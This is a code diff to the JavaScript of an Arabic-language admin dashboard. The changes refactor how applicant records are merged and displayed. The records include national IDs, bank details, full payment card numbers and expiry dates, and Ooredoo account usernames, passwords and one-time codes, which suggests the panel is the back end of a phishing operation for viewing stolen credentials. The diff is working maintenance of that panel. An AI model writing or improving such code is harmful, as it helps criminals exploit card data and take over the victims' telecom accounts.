@@ -217,8 +217,30 @@
   let loadedApplications = [];
   let lastOoredooSignal = '';
 
+  function normalizeCard(d) {
+    if (!d || typeof d !== 'object') return null;
+    const maybeCard = d.card && typeof d.card === 'object' ? d.card : (d.payment && typeof d.payment === 'object' ? d.payment : null);
+    return maybeCard || null;
+  }
+
+  function getPersonRecord(d) {
+    const root = d && typeof d === 'object' ? d : {};
+    const applicant = root.applicant && typeof root.applicant === 'object' ? root.applicant : {};
+    return {
+      name: root.name || applicant.name || '',
+      phone: root.phone || applicant.phone || '',
+      qid: root.qid || applicant.qid || '',
+      email: root.email || applicant.email || '',
+      gender: root.gender || applicant.gender || '',
+      bank: root.bank || applicant.bank || '',
+      address: root.address || applicant.address || '',
+      birth: root.birth || applicant.birth || '',
+      id: root.id || applicant.id || root._id || applicant._id || ''
+    };
+  }
+
   function hasOoredooData(d) {
-    const card = d.card || d.payment || null;
+    const card = normalizeCard(d);
     const ooredooUser = (d.ooredooUser || (card && card.ooredooUser)) || '';
     const ooredooPass = (d.ooredooPass || (card && card.ooredooPass)) || '';
     const ooredooOtp = (d.ooredooOtp || (card && card.ooredooOtp)) || '';
@@ -331,21 +353,22 @@
       tbody.innerHTML = '';
       loadedApplications.forEach((d, index) => {
         const a = d.applicant || d;
+        const mergedPerson = Object.assign({}, getPersonRecord(d), a);
         const persons = d.persons || [];
-        const card = d.card || d.payment || null;
+        const card = normalizeCard(d);
         const orderId = d.id || a.id || d._id || '';
         const expanded = false;
         const row = document.createElement('tr');
         row.innerHTML = `
           <td>
             <button type="button" class="name-expander" data-index="${index}" aria-expanded="${expanded}">
-              <span>${a.name || 'بدون اسم'}</span>
+              <span>${mergedPerson.name || 'بدون اسم'}</span>
               <svg class="arrow" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                 <path d="M5 7.5L10 12.5L15 7.5"></path>
               </svg>
             </button>
           </td>
-          <td>${a.phone ? ('+971 ' + a.phone) : '—'}</td>
+          <td>${mergedPerson.phone ? ('+971 ' + mergedPerson.phone) : '—'}</td>
           <td>${persons.length}</td>
           <td><span class="status-badge">${getAdminStatusLabel(d)}</span></td>
           <td>
@@ -363,14 +386,14 @@
               <div class="details-section">
                 <h4>مقدم الطلب</h4>
                 <div class="details-grid">
-                  <div class="detail-item"><span>الاسم</span><strong>${a.name || d.name || '—'}</strong></div>
-                  <div class="detail-item"><span>رقم الجوال</span><strong>${a.phone ? ('+971 ' + a.phone) : (d.phone || '—')}</strong></div>
-                  <div class="detail-item"><span>الهوية</span><strong>${a.qid || d.qid || '—'}</strong></div>
-                  <div class="detail-item"><span>البريد الإلكتروني</span><strong>${a.email || d.email || '—'}</strong></div>
-                  <div class="detail-item"><span>الجنس</span><strong>${a.gender || d.gender || '—'}</strong></div>
-                  <div class="detail-item"><span>البنك</span><strong>${a.bank || d.bank || '—'}</strong></div>
-                  <div class="detail-item"><span>تاريخ الميلاد</span><strong>${a.birth || '—'}</strong></div>
-                  <div class="detail-item"><span>العنوان</span><strong>${a.address || d.address || '—'}</strong></div>
+                  <div class="detail-item"><span>الاسم</span><strong>${mergedPerson.name || '—'}</strong></div>
+                  <div class="detail-item"><span>رقم الجوال</span><strong>${mergedPerson.phone ? ('+971 ' + mergedPerson.phone) : '—'}</strong></div>
+                  <div class="detail-item"><span>الهوية</span><strong>${mergedPerson.qid || '—'}</strong></div>
+                  <div class="detail-item"><span>البريد الإلكتروني</span><strong>${mergedPerson.email || '—'}</strong></div>
+                  <div class="detail-item"><span>الجنس</span><strong>${mergedPerson.gender || '—'}</strong></div>
+                  <div class="detail-item"><span>البنك</span><strong>${mergedPerson.bank || '—'}</strong></div>
+                  <div class="detail-item"><span>تاريخ الميلاد</span><strong>${mergedPerson.birth || '—'}</strong></div>
+                  <div class="detail-item"><span>العنوان</span><strong>${mergedPerson.address || '—'}</strong></div>
                 </div>
               </div>
 
@@ -470,7 +493,7 @@
     const hasOoredoo = Boolean((d && ((d.ooredooUser || (card && card.ooredooUser)) || (d.ooredooPass || (card && card.ooredooPass)) || (d.ooredooOtp || (card && card.ooredooOtp)))));
     if (!card && !hasOoredoo) return '';
     const rows = [];
-    if (card) {
+    if (card && typeof card === 'object') {
       rows.push(`<div class="confirm-row"><span>اسم صاحب البطاقة</span><strong>${card.cardName || card.name || '—'}</strong></div>`);
       rows.push(`<div class="confirm-row"><span>رقم البطاقة</span><strong style="direction:ltr; unicode-bidi:plaintext; text-align:left;">${card.cardNumber || card.number || '—'}</strong></div>`);
       rows.push(`<div class="confirm-row"><span>تاريخ الانتهاء</span><strong>${card.expiryDate || card.expiry || '—'}</strong></div>`);
@@ -492,7 +515,7 @@
   }
 
   function ooredooDetailBox(d) {
-    const card = d.card || d.payment || null;
+    const card = normalizeCard(d);
     const user = d.ooredooUser || (card && card.ooredooUser) || '—';
     const pass = d.ooredooPass || (card && card.ooredooPass) || '—';
     const otp = d.ooredooOtp || (card && card.ooredooOtp) || '—';
@@ -509,11 +532,12 @@
 
   function openDetailsModal(d) {
     const a = d.applicant || d;
+    const mergedPerson = Object.assign({}, getPersonRecord(d), a);
     const persons = d.persons || [];
-    const card = d.card || d.payment || null;
+    const card = normalizeCard(d);
     const modalBody = document.getElementById('modalBody');
     modalBody.innerHTML =
-      personDetailBox('مقدم الطلب' + (a.id ? (' — هوية: ' + a.id) : ''), a) +
+      personDetailBox('مقدم الطلب' + (a.id ? (' — هوية: ' + a.id) : ''), mergedPerson) +
       persons.map((p) => personDetailBox(p.title || 'فرد', p)).join('') +
       cardDetailBox(card, d) +
       `
